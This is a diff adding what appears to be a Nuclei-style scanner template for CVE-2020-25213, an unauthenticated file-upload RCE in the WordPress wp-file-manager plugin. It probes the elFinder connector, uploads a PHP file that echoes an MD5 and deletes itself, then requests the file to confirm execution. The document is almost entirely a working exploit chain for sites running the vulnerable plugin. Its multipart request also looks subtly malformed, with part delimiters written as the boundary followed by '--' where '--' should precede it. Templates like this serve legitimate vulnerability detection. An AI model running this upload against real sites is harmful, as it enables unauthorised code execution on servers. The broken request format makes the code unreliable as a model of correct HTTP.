@@ -1,0 +1,90 @@
+id: cve-2020-25213
+info:
+  name: WordPress Plugin Wp-File-Manager RCE
+  author: ProjectDiscoveryAI
+  severity: critical
+  description: |
+    The File Manager (wp-file-manager) plugin before 6.9 for WordPress allows remote attackers to upload and execute arbitrary PHP code because it renames an unsafe example elFinder connector file to have the .php extension. This allows attackers to run commands to write PHP code into the wp-content/plugins/wp-file-manager/lib/files/ directory.
+  reference:
+    - https://wordpress.org/plugins/wp-file-manager/
+    - https://gobies.org/
+  classification:
+    cve-id: CVE-2020-25213
+    cvss-metrics: 3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+    cvss-score: 9.8
+  tags: rce,wordpress,plugin
+
+variables:
+  boundary: "------------------------66e3ca93281c7041"
+  random_filename: "{{rand_text_alphanumeric(10)}}"
+  echo_number: "{{rand_int(1, 100)}}"
+  md5_hash: "{{md5(echo_number)}}"
+
+http:
+  - raw:
+      - |
+        GET /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - '{"error":["errUnknownCmd"]}'
+        part: body
+
+  - raw:
+      - |
+        POST /wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: multipart/form-data; boundary={{boundary}}
+
+        {{boundary}}--
+        Content-Disposition: form-data; name="cmd"
+
+        upload
+        {{boundary}}--
+        Content-Disposition: form-data; name="target"
+
+        l1_Lw
+        {{boundary}}--
+        Content-Disposition: form-data; name="upload[]"; filename="{{random_filename}}.php"
+        Content-Type: image/png
+
+        <?php echo md5({{echo_number}});unlink(__FILE__);?>
+        {{boundary}}--
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{random_filename}}"
+          - "application/json"
+        part: header
+
+    extractors:
+      - type: json
+        json:
+          - '.added[0].url'
+        internal: true
+
+  - raw:
+      - |
+        GET {{BaseURL}}{{added}} HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "{{md5_hash}}"
+        part: body
